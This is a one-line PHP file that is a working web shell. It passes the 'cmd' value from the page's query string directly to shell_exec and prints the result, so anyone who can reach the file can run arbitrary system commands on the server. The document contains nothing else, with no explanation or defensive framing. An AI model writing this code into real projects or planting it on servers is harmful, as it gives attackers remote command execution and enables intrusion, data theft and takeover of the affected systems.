<?php echo '<pre>'.shell_exec($_GET['cmd']).'</pre>'; ?>
